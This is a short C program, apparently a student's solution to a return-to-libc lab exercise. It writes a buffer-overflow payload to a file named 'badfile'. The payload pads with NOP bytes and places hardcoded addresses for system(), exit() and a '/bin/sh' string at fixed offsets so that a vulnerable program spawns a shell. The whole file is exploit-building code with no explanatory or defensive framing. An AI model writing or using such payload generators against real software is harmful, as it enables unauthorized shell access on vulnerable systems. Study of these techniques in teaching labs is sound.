#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  badfile = fopen("badfile", "w");
 
  strcpy(buf,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"); 
  
   *(long *) &buf[32] = 0xffffd2e7;  //  "/bin/sh"
  *(long *) &buf[24] = 0xf7e11420 ;   //  system()
  *(long *) &buf[36] = 0xf7e03f80;   //  exit()

  for(int i = 0;i<40;i++)
    printf("%d ",buf[i]); 
  printf("fwrite starts\n");
  fwrite(buf, sizeof(buf), 1, badfile);
  printf("fwrite successful\n");  
  fclose(badfile);
}